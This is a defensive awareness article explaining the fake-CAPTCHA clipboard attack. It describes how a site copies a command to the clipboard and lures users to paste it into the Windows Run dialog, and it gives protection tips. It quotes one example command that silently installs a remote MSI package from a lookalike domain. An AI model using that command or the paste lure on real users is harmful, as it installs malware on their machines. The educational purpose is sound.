## 📖 Overview

In today’s cybersecurity landscape, attackers are becoming smarter and using creative ways to trick unsuspecting users. One such dangerous and deceptive technique is called a **CAPTCHA Social Engineering Attack** — a method that abuses the familiar "I'm not a robot" CAPTCHA to compromise your system.

---

## ⚙️ How This Attack Works

1. You visit a suspicious or malicious website.
2. The site shows a seemingly legitimate CAPTCHA — similar to Google or Cloudflare’s human verification.
3. Believing it’s genuine, you click the CAPTCHA checkbox.
4. **Silently, a malicious command gets copied into your clipboard** without your knowledge. Example:

```
msiexec /qn /i https://clloudsverify.com/o.msi
```

5. Then you see a message like this:

> "To complete the verification process, press **Win + R**, then **Ctrl + V**, and hit Enter."

6. Once you obey:

   * **Win + R** opens the Run dialog.
   * **Ctrl + V** pastes the malicious command.
   * **Enter** executes it.

This installs malware silently — no alerts, no warnings.

## 🎯 Why This Attack is Dangerous

* **Trust Exploitation**: Users assume CAPTCHA equals safety.
* **Clipboard Hijacking**: Code is injected silently.
* **Social Engineering**: Users are tricked into executing commands.
* **Stealthy Execution**: The command uses Windows Installer (`msiexec`) in quiet mode (`/qn`) to avoid detection.

## 💥 Potential Impacts

* ⚠️ Full system compromise
* ⚠️ Theft of credentials, files, personal data
* ⚠️ Installation of Remote Access Trojans (RATs)
* ⚠️ Long-term backdoor access for attackers

## 🛡️ How to Protect Yourself

✅ **Never follow online instructions** asking you to use Win + R and paste commands.

✅ **Always check clipboard content** before pasting — open Notepad, press Ctrl + V, and inspect.

✅ **Avoid unknown or suspicious websites**.

✅ **Keep security software updated**.

✅ **Educate others** about such modern social engineering methods.

## 🚫 Important Reminder

Just because a CAPTCHA appears doesn’t mean a site is trustworthy. Fake CAPTCHAs can easily be weaponized for such attacks.

> **Stay alert. Stay secure.** 🔐
